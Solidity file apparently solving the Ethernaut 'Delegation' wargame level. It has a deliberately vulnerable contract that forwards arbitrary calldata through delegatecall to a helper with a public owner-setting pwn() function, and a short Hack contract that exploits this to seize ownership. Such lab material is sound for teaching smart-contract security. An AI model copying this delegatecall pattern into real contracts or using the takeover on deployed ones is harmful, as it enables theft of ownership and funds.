// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

// notice using this contract is not gonne pass the test, since the onwer is this Hack contract instead of the hacker account
// It is only using for the proof of concept of how to attack the contract
contract Hack {
    Delegation private immutable target;

    constructor(address _delegationAddress) {
        target = Delegation(_delegationAddress);
    }

    function hack() public {
        (bool success, ) = address(target).call(
            abi.encodeWithSelector(Delegate.pwn.selector)
        );
        require(success, "Delegate call failed");
    }
}
